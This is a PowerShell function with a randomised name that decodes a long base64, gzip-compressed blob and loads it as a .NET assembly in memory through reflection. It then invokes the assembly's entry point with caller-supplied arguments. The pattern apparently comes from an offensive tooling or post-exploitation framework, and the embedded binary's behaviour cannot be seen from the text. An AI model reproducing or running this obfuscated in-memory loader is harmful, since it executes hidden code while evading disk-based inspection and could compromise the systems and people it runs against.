function Invoke-Wppevmgif ($Params){
    if (!$Wppevmgif_assembly){
        $compressed = "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"
        $bytes = [System.Convert]::FromBase64String($compressed)
        $input = New-Object System.IO.MemoryStream( , $bytes)
        $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	    $gzipStream.CopyTo($output)
        $gzipStream.Close()
	    $input.Close()
	    [byte[]] $decompressed_bytes = $output.ToArray()
        $Script:Wppevmgif_assembly = [System.Reflection.Assembly]::Load($decompressed_bytes)
        "Loaded!"
    }
    $Wppevmgif_assembly.EntryPoint.Invoke($null, (, $Params.split()))
}
